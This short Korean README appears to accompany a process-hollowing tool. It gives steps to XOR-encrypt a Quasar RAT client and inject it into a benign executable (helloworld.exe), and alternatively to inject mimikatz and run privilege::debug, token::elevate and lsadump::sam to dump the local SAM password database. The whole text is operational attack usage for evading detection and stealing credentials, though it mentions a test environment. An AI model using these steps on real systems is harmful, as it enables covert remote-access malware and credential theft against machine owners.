# 순서

## Quasar로 진행할 경우

1. 여러분의 Client.exe를 여기에 올려준 encrypt.exe로 암호화하세요
encrypt.exe Client.exe Client_xor.bin

그 후 관리자 권한 cmd를 실행하신 뒤 

그 후 테스트 환경에서 다음과 같이 시도해주세요
Usage : hollowing.exe Client_xor.bin helloworld.exe 

## mimikatz로 진행할 경우

hollowing.exe mimikatz_exe.bin helloworld.exe 로 진행해주면 됩니다.

privilege::debug 디버그 권한 휙득

token::elevate System 권한 휙득

lsadump::sam : 로컬 계정 암호 데이터베이스(SAM) 덤프

각각 순서대로 실행해서 덤프 보여주시면 됩니다.
